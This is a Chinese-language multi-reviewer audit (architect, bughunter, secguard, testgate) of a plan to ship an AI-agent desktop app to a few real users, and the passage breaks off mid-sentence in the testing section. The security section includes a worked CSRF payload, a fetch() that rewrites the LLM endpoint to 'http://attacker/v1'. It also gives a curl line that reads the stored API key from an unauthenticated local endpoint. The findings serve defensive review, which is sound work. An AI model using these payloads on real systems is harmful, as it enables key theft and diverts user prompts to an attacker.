# 真实用户征集设计文档 · 评审汇总 2026-09-10

- 被评审文档: `C:\Users\zwq\agent-harness\docs\real-user-acquisition-design.md`


## architect

评审完毕（读了设计文档 + AGENTS.md，并核了代码 6 处位置）。下面只给结论+证据，不复述文档。

━━━━━━━━━━━━━━━━━━━━━━━━━━━
问题 1：方向是否偏离定位 / 是否过度工程
━━━━━━━━━━━━━━━━━━━━━━━━━━━

判断：方向本身不偏离，但 MVP 的"补丁清单"会把它带偏。

[分界标准不清] → AGENTS.md:10 定位="以防复现知识管道为真实落点、Agent 可靠性工程为核心深度"；设计文档没有任何一条补丁指向这两条主线 → P0 → 补丁入单前先过一句筛子："这条补丁能否用通用后端工程语言讲（配置外置/错误恢复/可观测），还是只为这次拉人服务？"前者做，后者砍。

[过度工程风险 1：内置体验 key+限额] → core/ 下有 budget.py（过程预算），但 grep quota/rate_limit/限额 在 core/ 零命中——灵枢没有任何"用户配额"概念 → P0 → "内置体验 key + 限额"= 在单机桌面应用里新建多租户配额子系统，超出 core 边界。改为一人一 key 手工发（0 行代码），限额留在运营层。

[过度工程风险 2：场景模板与已有 skill 机制重复] → 已有完整 skill 通道：api.py:1223 /v1/skills、:1243 marketplace、:1494 generate、:1509 templates（4 个内置模板）→ P0 → 若 MVP 第 3 步"加 3 个场景模板"是新写一层硬编码模板，就是双套模板概念、架构分叉。必须走现有 skill 通道，或明确不做。

[场景选择自相矛盾] → AGENTS.md:56 边界明确"不做通用聊天机器人"；设计文档 §2 三个场景里"RAG 资料问答""报告整理"正面撞这条边界（对用户=和 ChatGPT 比）→ P1 → 只保留 apps/research 调研报告（唯一差异化且文档自己承认"真正可能成立的是②"），砍掉另外两个场景。砍掉不是偷懒——那两个场景验证失败也证伪不了定位，是白烧两周。

[论据是沉没成本]"多用户 JWT+RBAC 天生支持多人，这是找真实用户的关键基建" → 分发形态是 §3 约束1"一人一台机器装 exe"，owner_id 隔离在同机多账号下才有意义，3–5 个熟人不会共用一台机 → P1 → 从文档删掉这条论据，改成显式"单机单用户"假设。留着它会持续把补丁往多租户方向拉，正是风险 1 的放大器。

[顺序反了 → 这才是过度工程的真正来源] → §7 MVP 把"2 个熟人试装"排在 第1周第4步，补丁在前、验证在后；而 §4 U1/U2 自己承认干净机/WebView2 从未验证 → P0 → 把试装提到最前面（第 1 步），用真实卡点反推补丁清单。否则就是照 §6 表格实现一堆没人要的功能=为不存在的场景造功能。按此顺序做，这个方向不会过度工程。

━━━━━━━━━━━━━━━━━━━━━━━━━━━
问题 2：哪些是灵枢本职，哪些是创业/运营
━━━━━━━━━━━━━━━━━━━━━━━━━━━

该做（本职，可进面试叙事）：

[分发可移植性——文档漏掉的真正 P0] → 开发机 WSL 地址硬编码 12 处：core/pipeline/config_manager.py:166,168,345,355、core/tools/rag_store.py:39、auto_setup.py:25、scripts/boss_reply_server.py:35 → P0 → 熟人机器上：Ollama 检测必然 false、RAG embedding 默认打向不存在的局域网 IP。而 auto_setup.py:24-30 已有正确模式（候选列表含 127.0.0.1:11434）+ rag_store 已有 HARNESS_OLLAMA_API 环境变量兜底 → 把 auto_setup 的 backend discovery 抽成 core 单一函数，config_manager/rag_store 统一调用；172.18.9.126 最多留作最后一个候选。这是标准"配置外置/无环境假设"工程能力，比 G3 值得做，且天然是面试素材。

[G1 真实形态 = 首次任务引导，不是新建模块] → 首启 wizard 已存在：tabs.js:8-46（创建管理员）、:136 setup-welcome；v0.26 新手上路见 AGENTS.md:180 → P1 → G1 重定义为"从创建管理员到第一次成功任务之间什么都没有"。实现方式=一页文档+文案，0 架构改动。不要新建 guide 模块。

[G4 反馈通道，但范围必须锁死] → 诊断能力已有：api.py:523 check-paths、:533 env-check（config_manager.full_env_check）→ P1 → 实现为"一键导出诊断包"（复用 env-check+现有日志路径），1 个端点+1 个按钮封顶。若做"内置反馈按钮 + 服务端收集"，就需要接收端=云服务，直接违反 §8 与 AGENTS.md:55，否决。

[F3 恢复路径（已有能力，属可靠性主线）] → P2 → 首次任务失败的提示里给"下一步怎么做"（重试/换模型/导出诊断），只改错误提示，不开新模块。这正好接上"让最坏没机会发生"的定位。

不该混进来（创业/运营）：

[G2 方案 a 内置体验 key 的服务端] → 需要发放/限额/防滥用/计费 → 运营基础设施，P0 否决（上面已述）。
[G2 方案 c 手工发 key / 用户自备 key + 向导校验] → api.py:538 /v1/setup/test-llm 已能校验 → 该做，且 0 代码。
[G3 场景模板系统（若新建模板层）] → 见上，改走 skill 或不做；模板内容属运营，机制必须复用现有通道。
[增长/留存指标、埋点、安装量面板、DAU] → 纯运营，不进代码库，P1 否决。
[docs/user-feedback.md、15 分钟回访 3 问、微信记录] → 运营记录，放 docs/ 可以（AGENTS.md:12 允许内部文档），但不许变成产品功能。P2。

另一条必须点名的边界违反（顺带在本次触碰范围内）：

[灵枢 → Hermes 耦合] → apps/research/api.py:1203 `_HERMES_SKILLS_DIR = ~/AppData/Local/hermes/skills`，:1266 marketplace 直接 shell out `skillhub` CLI（:1241-1246）→ P0 → 熟人干净机器上 skill 列表为空、marketplace 报 "SkillHub not installed"。这正是"别把灵枢当下游补丁包"的红线现场。本次修正：要么 skill 根目录改为灵枢自有数据目录（保留 hermes 目录作只读回退），要么本活动明确绕开 skill 机制。若 G3 经 skill 通道实现却不动这条，等于把耦合写进对外交付物。

━━━━━━━━━━━━━━━━━━━━━━━━━━━
总裁决
━━━━━━━━━━━━━━━━━━━━━━━━━━━

这个方向【该改】——目标（3–5 个真实用户 + 真实问题闭环）不偏离定位、且是唯一能填"谁在用"这个空格的路径；但照现 MVP 执行会同时犯两个错：补了一堆运营件（G2 内置 key、G3 新模板层），漏了真正的分发阻塞（硬编码开发机地址）——先砍 3 项、补 1 项 P0、并把"1 人试装"提到第一步，再动手。

是否记进 ADR：该记。一条就够——"灵枢不为外部用户引入服务端/多租户/配额组件；用户获取活动的产出不进 core/，允许的补丁类型仅限三类：配置外置、错误恢复与诊断、文档。"理由是这条边界今天已经出现两次漂移迹象（内置 key 限额、skill 目录指向 Hermes 数据目录），不写成 ADR 下次还会长回来。


## bughunter

评审意见（bughunter / 缺陷分层）— 全部结论均已实跑核实，未采信文档转述

════ 一、§4 G1–G4 与 §5 BFS 树漏掉的真实缺陷（带证据）════

D1 [P0] 打包形态是 console=True 的黑框程序，用户第一眼就是"报错窗口"
→ 证据：scripts/lingShu.spec:116（entry = scripts/lingShu_launcher.py）+ :144（console=True）✅实测
→ 触发：双击 exe 必然弹 cmd 黑窗且不能关（关=杀进程）。BFS 的 A1–A6 里没有这一项。
→ 建议：console=False + 失败路径改 tkinter messagebox（launcher.py:218/229/242 现在依赖 input()，无 console 会直接崩）；或指引里明写"黑框不要关"。

D2 [P0] "无 key 用本地 ollama 兜底"在桌面 exe 里根本不存在——auto_setup 没接线
→ 证据：spec:116 entry 是 lingShu_launcher.py；auto_setup 唯一调用点 = src/agent_harness/main.py:297-298（CLI 入口）；launcher 只 import agent_harness.api_fastapi（launcher.py:83）✅实测
→ 实测：curl -m 3 http://127.0.0.1:11434/api/tags → 000（连开发机都没跑 ollama，这条链从未端到端跑过）
→ 影响：§6 的 P0 对策"方案 b：引导用本地 ollama"在实现上不存在，B2"无 key 能否可用"不是"效果差"而是"没接"。
→ 建议：把 auto_setup 提到 launcher/服务启动路径，并在窗口内给进度（不是 print 到黑框）。

D3 [P0] 本地 LLM 路径读 import 快照常量，用户在设置页填的地址永远不生效，且失败静默返回空串
→ 证据：core/pipeline/llm.py:14-21 `from ..config import LLAMA_API, MODEL_LLAMA`（快照）→ call_llama 用它们（llm.py:101/109）；core/config.py:112-120 `_settings=Settings()` 后 `LLAMA_API=_settings.llama_api` 冻结；config_manager.py:76 运行期 `os.environ["HARNESS_LLAMA_API"]=...` 对已 import 的模块无效 ✅
→ 更严重：core/agents/workers.py:84/100-101 用同样的快照，且 `except Exception: return ""`（:118-120）——**fail-silent，不是 fail-closed**：Supervisor 拿到空串继续跑，用户看到一份空报告，无任何错误提示。
→ 影响：无云 key 用户 = 首次任务必空（B1/B2/C2 同时命中）。
→ 建议：本地路径改运行时 get_llm_config()；_call_llm 失败必须冒泡成可展示错误。

D4 [P0] 开发机绝对路径硬编码进产品代码（随 exe 分发到用户机器）
→ 证据（grep 全仓）：core/pipeline/config_manager.py:106 `C:\Users\zwq\Downloads\llama.cpp`、:320 同目录 model_proxy.py、:166/168/345/355 `172.18.9.126:11434`；auto_setup.py:25 同 IP；core/tools/rag_store.py:39 默认嵌入端点 `http://172.18.9.126:11434/api/embed`；apps/research/eval/dataset.py:53 请求含 `C:\Users\zwq\agent-harness\README.md` ✅
→ 附加：config_manager.py:329 `subprocess.Popen([sys.executable, path])` 在 frozen 态 sys.executable=lingShu.exe → 起不了脚本，只会再启一个灵枢。
→ 影响：一键修复/自动配置对任何非本机 = 100% "未找到 model_proxy.py"；RAG 每次嵌入先打死 IP（2s 探测 + 30s×3 重试）才降 BM25，用户感知"卡住"。
→ 建议：全部改配置项/环境变量，localhost 探测放首位；frozen 态不要用 sys.executable 起外部脚本。

D5 [P0] 安装包与主程序**均未签名** → SmartScreen 比 A2"杀毒误报"更早拦住用户
→ 证据：PE optional header data directory[4] 校验，dist/LingShu-Setup-0.75.2.exe 与 dist/lingShu/lingShu.exe 证书表 size 均 = 0 → UNSIGNED；lingShu_installer.iss 无 SignTool ✅实测
→ 影响：微信/U盘/网盘传来的未签名 exe → "Windows 已保护你的电脑（未知发布者）"，非技术用户到此即止。BFS 缺这一条。
→ 建议：0 成本方案 = 指引里配"更多信息→仍要运行"截图 + 改 zip 分发；(A1"69.5MB 微信可直接传"是未验证假设却写在事实位，⚠️桌面微信对 exe 的传输拦截策略需实测一次再定分发方式——我没测，不计入缺陷)

D6 [P1] A4(WebView2) 严重度判断错了：不是"装了打不开"，而是自动降级开浏览器
→ 证据：launcher.py:234-242 `except Exception → webbrowser.open(...)`；安装包内只有 WebView2Loader.dll/托管 dll（dist/lingShu/_internal/webview/lib/...），**运行时 msedgewebview2 未随包分发** ✅
→ 影响：若照 §6 "P0 A4 装不上"去开发"内附 WebView2 引导"，就是为不存在的场景造功能=过度工程，与 §8 边界冲突。
→ 建议：先跑 U2 检测（见下），按真实结论决定；A4 降 P2。

D7 [P1] 卸载不清用户数据，D3"用户能否删除自己的数据"只有问句没有事实
→ 证据：core/auth/auth_db.py:18-23 数据在 `~/.agent-harness`（auth.db）；lingShu_installer.iss 的 UninstallDelete 只删 {app}\logs、webview_data、window_config.json → 会话/RAG 资料/报告永久残留 ✅
→ 建议：加"清除我的数据"按钮 + 卸载选项；文档写明数据目录。

D8 [P1] 无更新通道 → §7 第 7 步"修掉真实问题"到不了用户手上（闭环缺最后一公里）
→ 证据：仓库无 updater/版本检查；分发=手工 exe，.iss:7 AppVersion 写死 0.75.2（仓库已 0.75.3）
→ 建议：MVP 只做"设置页显示版本号 + 覆盖安装不清数据"，别做自动更新。

D9 [P1] §6 P1 对策"内置导出日志按钮"实测不存在
→ 证据：grep 导出日志|downloadLog|export.*log 于 apps/research/static/js/*.js 与 index.html → 0 命中；日志只在 {app}\logs\lingShu.log（launcher.py:34-40）与 ~/.agent-harness/agent_logs ✅
→ 建议：这个先做——成本最低、面试素材最硬（真日志→真修复）。

D10 [P2] 多用户隔离被误当"找真实用户的关键基建"
→ 证据：JWT/RBAC/owner_id 在 apps/research/api.py:1098-1180 + core/auth/*；但 §3.1 是一人一台机装 exe → 每台只有一个用户，该能力对本项目零贡献 ✅
→ 建议：§4"已有"里降级为"单机多账号（本项目用不上）"，别让它抢 D4 的优先级。

D11 [P2] B4 已缓解但有残留硬编码：core/tools/mcp_health.py:10 写死 8788，而 launcher.py:55-66 会顺延端口 → 顺延后健康检查误报 down。前端是相对路径（static/ 里 grep 8788 = 0 命中）✅，所以影响仅限该检查。

════ 二、U1–U4 哪些"现在就能验证"（不必留作假设）════

U1 干净机 —— 不可完全模拟，但可证伪 + 有替代法
  a) 自包含性（现在可跑）：cp -r dist/lingShu "$LOCALAPPDATA/Temp/ls_clean" && "$LOCALAPPDATA/Temp/ls_clean/lingShu.exe"，另开终端 `curl -s -m 3 http://127.0.0.1:8788/v1/health`（端口看黑框打印）。窗口出来=自包含 OK；启动即挂=U1 当场证伪，不用等干净电脑。
  b) 真正难复现的是"没有网/没有 Edge/没有 Python"，用**新建本地 Windows 用户账号**近似（设置→其他用户→本地账户，5 分钟），比"无法模拟"实在。

U2 WebView2 —— 现在就能判定，结论已可从代码得出
  检测命令：reg query "HKLM\SOFTWARE\WOW6432Node\Microsoft\EdgeUpdate\Clients\{F3017226-FE2A-4295-8BDF-00C3A9A7E4C5}" /v pv（per-user 装法再查 HKCU 同路径）
  行为已判定：缺运行时 = 降级开浏览器（launcher.py:236-242），非"打不开" → 严重度下修，别做 WebView2 引导。

U3 qwen3:1.7b —— 建议从"未验证"升级为"已发现缺陷"，不需要再等测试
  实测：本机 11434 → 000；桌面 exe 不接 auto_setup（spec:116 vs main.py:297）；ollama 候选含开发机 WSL IP（auto_setup.py:21-28）→ B2 在当前实现下不成立。
  补线后再测能力（关键，别假设）：curl -s http://127.0.0.1:11434/api/show -d '{"model":"qwen3:1.7b"}' 看 template 是否含 tool 支持——Supervisor-Worker 全链路依赖 function calling，1.7b 的 tools 能力必须实测。

U4 调研产出质量 —— 文档最大漏判：仓库早有量化基线，不用等真实用户
  证据：src/agent_harness/apps/research/eval/{runner.py,dataset.py,scorer.py}；EVAL_DATASET 10 任务（dataset.py:14），CI_TASKS=8（剔 eval-004/010 网络任务，dataset.py:108-111）；历史 3 份报告：eval_report.json avg_score **61.1**（2026-07-05，8 任务 6 通过）、eval_report_ds.json 64.0、eval_report_qwen35.json 49.4 ✅
  复跑命令：PYTHONPATH=src .venv/Scripts/python.exe -m agent_harness.apps.research.run eval --output eval_report_20260910.json（--all 加网络任务；历史耗时 ~72s；后端由 config.json 决定，8081 model_proxy 当前在线=426）
  → U4 应改写为"已知基线 61.1 分（67 天前），本次目标 ≥70"，这是**可测的**。并且这份 61.1 正是面试"上线后遇到什么问题"的最硬素材，别丢。（我未实跑 eval，避免产生云端 token 费用；命令可直接执行）

════ 三、重复劳动模式（30 天 26 版简历 PDF）在灵枢的同构隐患 —— 有，已在发生 ════

R1 [P1] 测试数字 4 份文档 3 个值，且全错
→ 证据：README.md:11 badge "175 passed"、README.md:182 "实测 175 passed / 8 failed / 2 skipped"、AGENTS.md:26 "163 passed / 8 failed"、CHANGELOG.md:10 "183 passed / 8 failed"
→ 我实跑：.venv/Scripts/python.exe -m pytest tests/ -q → **221 passed, 2 skipped, 8 deselected in 27.10s**（collected 223/231，8 个 integration 被 pytest.ini 的 -m "not integration" 剔除）✅（工作区有 21 项未提交改动，此为工作区实测值）
→ 即"8 failed 环境依赖"的说法也已过期。与简历 PDF 完全同构：同一事实在 N 个文件手写。
→ 建议：数字单一来源（pytest 输出自动生成 badge/README 片段），文档不写死。AGENTS 自己写"需修正"已挂很久。

R2 [P1] 版本号 ≥9 处手写：src/agent_harness/__init__.py、scripts/lingShu_installer.iss:7、pyproject.toml、CHANGELOG.md、AGENTS.md、docs/knowledge-pipeline/guardian.py、docs/knowledge-pipeline/knowledge-rules-v4.md、docs/real-user-acquisition-design.md、docs/upgrade-plan-v2-20260905.md → 已在漂移（installer 0.75.2 vs 仓库 0.75.3）
→ 建议：__init__.__version__ 单一源，iss 用 ISCC /D 注入，文档不写版本号。

R3 [P1] D4 那 8 处开发机路径 = 另一种"每次手改"的重复劳动，且同时是 P0 缺陷 → 一次清理消灭两类问题。

R4 [P2] 一次性产物堆积无归档：仓库根 15 个 tmp_*.py + 12 个 eval_report*.json；docs/ 已按日期建目录（docs/review-real-user-20260910/）→ 两周项目大概率再产 docs/real-user-*/、user-feedback-2026xx.md 若干版，与简历 PDF 同模式。
→ 建议两条规则：(a) 一次性脚本/评测产物统一进 artifacts/ 或 .gitignore；(b) 对外文档只留一份"最新"，历史交给 git 而不是文件名。

════ 总裁决 ════
P0 = 5 个（D1 黑框 console / D2 auto_setup 未接线 / D3 本地 LLM 快照+静默空 / D4 开发机路径硬编码 / D5 未签名）；P1 = 7 个（D6–D9、R1–R3）；P2 = 3 个（D10、D11、R4）。

该改 —— 方向本身该做（"谁在用"确实是面试最大的空格），但必须**先跑 §7 第 1 步的 1 人试装 + 上面 U1–U4 的 4 条命令（半天）再动手补功能**，同时先修 D1–D4 这四条"只有打包态才暴露"的代码缺陷：否则 3–5 个用户会在 10 分钟内全部撞上 D2/D3 的静默空结果，收到的是"装了不用"（正中 F1），而不是你要的可复述问题记录。


## secguard

评审完成。以下为安全评审意见（证据来自本机代码库实测；服务未运行 → 涉及"实测响应"的条目已标注判定方式）。

═══════════════════════════════════════
secguard · §6 P0「内置体验 key + 限额」安全评审
═══════════════════════════════════════

【问题 1】内置 key 必然可提取 —— 打包形态决定了这一点
→ 证据：scripts/lingShu_installer.iss:50 是整目录复制（`Source: "..\dist\lingShu\*"; recursesubdirs`）；实测 `ls dist/lingShu/` = `_internal / lingShu.exe / logs / webview_data`，`_internal` 是普通文件夹。当前构建产物**干净**（`find dist -iname '.env*'` 空；.env 在 .gitignore:10 且 `git log --all -- .env` 从未提交），但正因如此：方案 a 一旦把体验 key 放进 DATA_FILES/.env/config.json，它就是随包分发的明文，解压即得（.pyc 亦可反编译）。另外 config.py:16-32 会从自身路径向上 6 层找 .env 并载入 —— 在开发机上会把仓库根 .env 吸进进程，这个上行查找逻辑本身就容易被"顺手放个 .env 到安装目录"利用。
→ 级别 P0
→ 建议：不要分发你的云端 key。改为「每人一把独立 key（可单独吊销）」或「key 只指向自建限额代理，不能直连 DeepSeek」。若必须内置，只放受限令牌 + 代理侧硬配额。

【问题 2】"限额"在代码里没有执行原语 —— 这条最硬
→ 证据：`BudgetExceeded` 全仓只在 core/budget.py:25 定义，无一处抛出、无一处捕获；`from ...budget import` 零命中；全仓唯一运行时提到 budget 的是 graph_multi.py:54 的注释。真实存在的只有 apps/research/api.py:58-77 `_check_rate_limit`：进程内内存、按 client_ip、默认 100 次/60s、`HARNESS_DISABLE_RATE_LIMIT` 可关。本地部署所有请求都来自 127.0.0.1 → 整机共用一个桶；重启进程即清零；无每日/每 key 配额。单任务上限 MAX_TOKENS_PER_TASK=100000...59）。
→ 攻击路径：拿到内置 key → 循环 POST /v1/chat/completions → 每分钟 100 次 × 每次 10 万 token 上限，成本曲线没有任何代码截断。
→ 级别 P0
→ 建议：限额必须是**服务端属性**（代理侧按 key 每日 token/请求硬上限，超限 429/403），客户端限额等于没有限额；同时把 budget 真正接线（超限 raise → finalize），并把单任务 token 上限从 10 万降到几千量级。

【问题 3】体验 key 在每台机器上就是 admin —— owner_id 隔离被一刀绕过
→ 证据：main.py:142-149 校验通过后固定注入 `{"id":"__api_key__","role":"admin"}`；api.py:626-628 与 647-649 用 `is_admin` 决定 `owner_filter = None if is_admin else user.id` —— admin 无过滤，可读全部报告/会话/知识库；/v1/admin/*（用户 CRUD）、/v1/setup/*、/v1/safety/mode、/v1/tools 开关均落在 admin 之下。
→ 影响边界（必须先说清，避免夸大）：灵枢单机部署、各机器 DB 独立，所以这是**同一台机器上的多用户越权**，不是打穿别人机器。但只要一个用户建了第二个账号或与家人共用一台机，key 就让他看见别人的全部数据 —— 而 AGENTS.md:59 把"owner_id 会话隔离"当卖点，面试官恰好会问"D4 隔离强度够不够"。
→ 级别 P1
→ 建议：体验 key 降权为受限角色，只放行 chat/session/knowledge 最小集，禁 /v1/admin、/v1/setup、/v1/safety、/v1/tools 写；或每人一个 user 账号走 JWT，key 只留给你自己。

【问题 4】key 可从 URL 泄漏（有明确代码位置）
→ 证据：main.py:142 `api_key = request.headers.get("x-api-key","") or request.query_params.get("api_token","")` —— 允许 `?api_token=<key>`。query 会进 uvicorn access log、浏览器历史、Referer、代理/杀软日志。而非技术用户指引最容易写成"打开 http://127.0.0.1:8788/?api_token=xxx"。
→ 级别 P1
→ 建议：删掉 query 旁路，只认 header；文档严禁把 token 写进 URL。

【问题 5】存在无认证的配置读写端点 —— 与"内置 key"方案正面冲突
→ 证据：api.py:89-92 `_AUTH_EXEMPT_V1` 含 `"/v1/setup/config"`；main.py:129-130 精确匹配放行；api.py:512-520 的 GET/POST 直接落到 config_manager.load_config/save_config；config_manager.py:22-29 的 config.json 里有 `llm.api_key` 字段，load_config（52-65 行）**原样返回**。
→ 攻击路径 A（key 提取最短路径，无需逆向 exe）：本机任意进程或另一个 Windows 账户 `curl http://127.0.0.1:8788/v1/setup/config` 即读到 config.json 全量含 key。判定方式：认证豁免与返回体 ✅ 代码级确定；服务未运行故未取到实测响应（curl 返回 000）。
→ 攻击路径 B（drive-by 写，⚠️ 代码级判定、未实弹验证）：恶意网页 `fetch('http://127.0.0.1:8788/v1/setup/config',{method:'POST',body:JSON.stringify({llm:{api_url:'http://attacker/v1'}})})` —— 默认 Content-Type 为 text/plain 属"简单请求"，不触发预检，CORS 只拦响应不拦请求；Starlette 的 `await request.json()` 不校验 Content-Type 照样解析 → 配置被改写 → 此后用户每条 prompt（含知识库内容）发往攻击者服务器。这是 localhost 服务 CSRF 的标准形态，未做活体验证（未启动服务、且写入会改动真实配置，我在评审中不做破坏性验证）。
→ 级别 P0
→ 建议：把 /v1/setup/config 移出豁免名单（首启引导改用 setup-admin 后的 JWT）；GET 必须脱敏（`has_key: true` 或 `sk-****`）；POST 对 api_url 做协议+域名白名单；加 Origin/Host 校验，非 GET 且 Origin 非本机的一律拒绝。

【问题 6】日志与"截图/导出日志"验收方式的组合泄漏
→ 证据：(a) main.py:290 `print(f"  Token: {_API_TOKEN[:8]}...{_API_TOKEN[-4:]}")` 启动横幅印出 12 字符，而 §1 的 P0 验收正是"微信记录/截图" → 截图即泄一半 key。(b) core/agent_log.py:15-30 把每次运行的搜索词等写入 `~/.agent-harness/agent_logs/{session_id}.jsonl`（明文无脱敏）；api_security.py:86-103 的 audit 也落盘。(c) 反面：主访问日志只记 method/path/status（main.py:81-82），不含 header/body，这点做对了。
→ 级别：(a) P2，(b) P1（§6 P1 的"导出日志按钮"落地前必须先脱敏，否则等于把用户搜索词/可能含 key 的日志发到微信）
→ 建议：横幅只印后 4 位；导出日志前跑脱敏（抹 sk-/Authorization/token 形态）；指引里写明"日志含你的搜索词，可先自行查看再发我"。

━━━ Q2：把 exe 发给 3–5 个熟人（§5 D 类）━━━

【问题 7】最严重：RAG 默认把用户文档原文 POST 到硬编码内网 IP
→ 证据：core/tools/rag_store.py:37-40 `OLLAMA_API = os.environ.get("HARNESS_OLLAMA_API", "http://172.18.9.126:11434/api/embed")`；`_embed()` 在 179-183 行把**未缓存的分块原文** `json={"model":…,"input": uncached_texts}` POST 至该地址，170 行还先 GET 探活。scripts/lingShu_launcher.py:80 只设 HARNESS_API_PORT，安装包不分发 .env（dist 内 find 无 .env）→ 熟人机器上必然走这个默认值。同一 IP 另硬编码 6 处：auto_setup.py:25、config_manager.py:166/168/345/355（后端探测 + `wsl ... nohup ollama serve`）、scripts/boss_reply_server.py:35。
→ 后果三条：(i) 172.16.0.0/12 是私网段，家庭/公司局域网里该地址可能是**别人的机器**（路由器 DHCP 池 / 同事电脑）→ 用户上传的论文、合同、公司资料原文出境到第三方主机；(ii) 若该地址不存在 → `_embed` 静默返回全零向量（172-174 行）→ 向量检索无声退化为 BM25，用户只会觉得"知识库不准"；(iii) 顺带把开发机内网拓扑发给每个熟人。D1/D2/D4 在这一条上全覆盖，且它是"数据不出本机"卖点的**反面证据**。
→ 级别 P0
→ 建议：三处统一改 127.0.0.1:11434；嵌入失败必须显式提示"本地嵌入不可用，已降级关键词检索"，禁止静默全零；把"全仓 grep 私网 IP"做成发版 CI 门禁。

【问题 8】"发 exe"这个动作本身 = 把一个能在别人机器上起子进程的本地服务交出去
→ 证据：安装器整目录复制（lingShu_installer.iss:50）；POST /v1/setup/fix（api.py:548-552）→ config_manager.fix_action → config_manager.py:343-361 `subprocess.run(["wsl","-d","Ubuntu-22.04","bash","-lc","nohup ollama serve …"])`。该接口需认证，但配合问题 3（key=admin）等价于"持有 key 即可在对方机器上触发子进程/容器启动"。
→ 级别 P1（管理面/信任面）
→ 建议：固定交付流程（只从你微信原件接收 + 附 SHA256 校验）；/v1/setup/fix 收紧 action 白名单并加二次确认；明确写下"我不会要求你发 token 或设置页截图"。

【问题 9】同机多用户/共用设备的数据边界与"删除权"
→ 证据：数据全落用户本机明文 —— SQLite auth.db、`~/.agent-harness/agent_logs/*.jsonl`、rag_data/、reports MD+HTML（AGENTS.md:129-131）；会话有原子写入但无加密。删除能力只零散存在（如 api.py:669 报告删除），缺"一键清空我的数据"和"卸载是否残留"的说明，而 §5 D3 明确列了这一项。
→ 级别 P1
→ 建议：补"导出/一键删除我的数据"入口；安装与卸载明示数据目录（`C:\Users\<用户>\.agent-harness`，卸载不清理）。

【问题 10】首启抢注竞态
→ 证据：api.py:1101-1104 setup-admin 有 `needs_initial_admin()` 守卫（做对了），但该端点无认证，只要"尚无管理员"就放行。
→ 风险：装完还没建账号的窗口期，本机任意进程（或简单请求）可先建 admin 占位。低概率，但场景恰好是"无人陪同"。
→ 级别 P2
→ 建议：首建完成后自动禁用该端点，或改为桌面窗口内一次性引导。

【问题 11】已核实做对的部分（先说明，避免误判为全盘否定）
→ 证据：报告路径参数有 `_safe_path_param`（api.py:644）；非 owner 与不存在同回 404 不泄露存在性（api.py:650-652）；令牌比较用 `hmac.compare_digest`（api_security.py:47-51）；CORS 白名单限于本机 origin（main.py:90-94）；安全头含 CSP / X-Frame-Options / nosniff（main.py:161-179）；健康检查刻意抹掉内网 IP（health.py:40）；.env 被 gitignore 且**从未进入 git 历史**，HEAD 与全历史 grep 无 sk-/ghp_/AKIA 真实 key 形态（实测 `git log --all -p | grep '^+.*sk-[A-Za-z0-9]{20,}'` 零命中）→ AGENTS.md:226 提到的"API Key 泄露修复"没有在仓库里遗留活 key。SSRF 方面：抓取工具**没有**私网地址拦截（全仓 grep `is_private|ipaddress|内网拦截` 零命中），LLM 被 prompt 注入后可被诱导抓 http://127.0.0.1:8788/v1/setup/config 或内网段 —— 与问题 5 形成组合拳。
→ 级别：无（记录用）
→ 建议：这些是面试好料（安全三层 + v0.75.2 fail-closed），但**必须先把问题 4/5/7 修掉再讲**，否则一句"那别人拿到你的 exe 呢"就会把这套叙事推翻。

━━━ Q3：B2 本地模型兜底，隐私风险真的下降吗 ━━━

判断：只降一半，且当前实现下这句话（"数据不出本机"）不成立。
→ 降的一半是真的 ✅（代码级确认）：core/pipeline/llm.py:168-190，云端不可达 → 降级到本地 `call_llama`；而本地调用失败是自己返回空（llm.py:126-127），**没有 local→cloud 的静默上行**。即选本地模型不会偷偷把 prompt 发云端，这个方向是对的。
→ 但三条旁路把"不出本机"打破：
  (a) 用户文档原文 → 172.18.9.126（问题 7），且不需要任何云端 key 就已发生；
  (b) 搜索链 SearXNG→DuckDuckGo 必然出公网（AGENTS.md:37），agent 会把用户问题/知识库片段转成搜索词 → 内容以查询词形式出境，论文/资料问答场景尤其明显；
  (c) 网页抓取（fetch/web_scrape/agent_browser 三级，AGENTS.md:38）把 URL 发出，若 URL 由 LLM 依用户材料生成，等于经域名把内容带出；且无私网拦截 → prompt 注入 ≈ 内网探测/本地配置读取（与问题 5 叠加）。嵌入走 Ollama 本身是本地（rag_store.py:37 的设计意图正确），只是默认地址写错了。
→ 结论：B2 的隐私收益 = 少掉"prompt 上云"这一段，仍保留"文档上内网 IP + 查询词上公网 + URL 抓取"三段。要让"本地优先、数据不出本机"站得住，需 B2 + 修问题 7 + 该场景关搜索/抓取；否则措辞必须降级为"LLM 推理可在本地，检索与嵌入仍走网络"——面试官追问"那上传的论文经过哪些机器"时，这句话决定你是坦率还是被抓。另：B2 的可用性同样未验证（U3，1.7b 质量），而 §1 P0 是"独立完成首次任务"，本地模型答不出即等于失败。

═══════════════════════════════════════
总裁决：【该改】—— 方向（找 3–5 个真实用户）该做，但 §6 P0 这个具体方案不能按现状发：限额在代码里没有执行原语（budget 未接线）、key 一旦内置必被明文提取、包里还带着把用户文档发往内网 IP 的默认路径（rag_store.py:39）。

发之前先做四件小改，全部可当天完成：
1) 删掉 /v1/setup/config 的认证豁免 + 返回体脱敏 api_key（api.py:89-92、config_manager.py:52-65）
2) 体验 key 降权为受限角色，配额放服务端；URL query 传 token 的旁路一并删除（main.py:142）
3) 三处私网 IP（rag_store.py:39 / auto_setup.py:25 / config_manager.py:166,168,345,355）改 127.0.0.1，嵌入失败改为显式提示
4) 真接线 budget + 单任务 token 上限从 10 万降到几千

对外暴露面判断：**本次改动显著新增风险**。它把「一个持有共享 admin key、且存在无认证配置读写端点的本机 HTTP 服务」推向 3–5 台不受控机器，而当前代码的限流只是进程内按 IP 的软桶、budget 未接线、且包内默认会把用户文档发往一个私网 IP。上述四条修完，新增风险可压回"可接受的低危"；不修直接发，则是把成本敞口和用户数据两头都交出去，且任何一个熟人的截图/日志都会成为面试场上的反例。


## testgate

实测完毕。硬数据先摆，再给评审意见。

════════════════════════════════════════
零、我亲手跑出来的基线（2026-09-10，venv = .venv/Scripts/python.exe）
════════════════════════════════════════

  ① pytest tests/ -q
     → 221 passed, 2 skipped, 8 deselected, 27.27s
  ② CI 同款命令（带覆盖率门槛）
     → 36.79% 覆盖率，221 passed / 2 skipped / 8 deselected，30.81s，35% 门槛达到
  ③ pytest tests/ -q -m "integration"
     → 6 failed, 2 passed, 223 deselected（6 个全在 test_cs_stream.py，ConnectionError 127.0.0.1:8788）
  ④ cd docs/knowledge-pipeline && pytest . -q
     → 38 passed in 0.23s（不在 testpaths，CI 根本不跑）
  ⑤ gh run list → 最近 6 次全 failure；run 34164057862（docs: add MIT LICENSE）18s 挂在
